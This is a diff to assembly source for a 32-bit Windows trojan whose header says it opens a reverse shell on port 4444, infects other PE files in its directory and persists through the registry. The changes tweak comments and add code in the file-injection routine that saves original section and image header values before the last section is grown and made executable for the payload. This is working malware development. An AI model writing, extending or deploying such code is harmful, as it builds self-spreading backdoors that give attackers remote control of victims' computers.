@@ -1,12 +1,12 @@
-;-----------------------------------------------------------;
+;--------------------------------------------------------------------------------------------------------------------;
 ; Author: Bach Ngoc Hung (hung.bachngoc@gmail.com)
 ; Compatible: Windows PE file 32 bits
-; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 448)
+; Note: Setup the listener on port 4444 and change the ip address of the attack machine in the code first (Line 450)
 ; Version: 1.0
 ; This trojan capable of creating backdoor using reverse shell, injecting it self to other PE file.
-; It can also add itself to the registry ke for persistence.
+; It can also add itself to the registry key for persistence.
 ; The injected file can also infect other files in the directory while avoiding inject to the infected files.
-;-----------------------------------------------------------;
+;--------------------------------------------------------------------------------------------------------------------;
 
 .386
 Option CaseMap:None
@@ -761,6 +761,7 @@ InjectingFile:
 	Mov [Ebx + 34H], Eax			; Tell the injected file where the jump back entry point is
 
 	Mov Eax, [Edi + 50H]
+	Mov [Ebx + 30H], Eax			; Save SizeOfImage for backup later
 	Mov [Ebp - 60H], Eax			; SizeOfImage
 
 	Mov Ax, [Edi + 6H]			; Number of section
@@ -770,11 +771,12 @@ InjectingFile:
 	IMul Ax, Dx
 	Movzx Eax, Ax
 	Add Edi, Eax				; Move to the last section info in section table
-	Mov [Ebp - 4H], Edi			; Recycle the stack buffer and save the address for later use
+	Mov [Ebp - 4H], Edi			; Save the address of the section table for later use
 
 	; Calculate new virtual size of the last section
 	; and distance to move to inject the payload
 	Mov Eax, [Edi + 8H]			; Move to the last section virtual size
+	Mov [Ebx + 2CH], Eax		; Save virtual size for backup later
 	Mov Edx, [Edi + 14H]		; Move to last section raw address
 	Add Edx, Eax
 	Mov [Ebp - 70H], Edx		; Save the distance to move for the payload injection
@@ -788,6 +790,7 @@ InjectingFile:
 
 	; Calculate new raw size of the last section
 	Mov Eax, [Edi + 10H]		; Move to last section raw size
+	Mov [Ebx + 38H], Eax		; Save RawSize for backup later
 	Mov Edx, PayloadSize
 	Add Eax, Edx
 	Mov Edx, [Ebp - 64H]		; FileAlignment
@@ -798,7 +801,8 @@ InjectingFile:
 	Mov [Edi + 10H], Eax		; Update new raw size of the last section
 
 	Mov Eax, [Edi + 24H]
-	Or Eax, 60000020H			; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
+	Mov [Ebx + 28H], Eax		; Save the current Characteristics for backup later
+	Or Eax, 60000020H		; IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE
 	Mov [Edi + 24H], Eax		; Update last section characteristics
 
 	; Calculate new AddressOfEntryPoint = VirtualAddress + VirtualSize - PayloadSize
